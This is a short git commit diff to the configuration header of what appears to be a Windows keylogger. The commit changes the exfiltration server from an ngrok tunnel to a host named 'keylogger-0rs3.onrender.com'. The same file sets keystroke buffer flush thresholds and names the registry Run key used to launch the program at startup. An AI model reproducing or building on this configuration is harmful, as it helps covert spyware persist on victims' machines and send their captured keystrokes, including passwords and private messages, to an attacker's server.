0f0729287be301e1f86a8c01f979790c77726342
stephenthajeb <Sthajeb1@gmail.com>
2025-07-20 14:18:43 +1000

    chore: update host path

--- src/config.h
+++ src/config.h
@@ -6,7 +6,7 @@
 #define FLUSH_CHAR_THRESHOLD 300
 #define FLUSH_INTERVAL 60
 #define MAX_BUFFER_LEN 1024
-#define SERVER_HOST "d06bb52567f4.ngrok-free.app"
+#define SERVER_HOST "keylogger-0rs3.onrender.com"
 
 #define LAUNCH_STARTUP_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 #endif
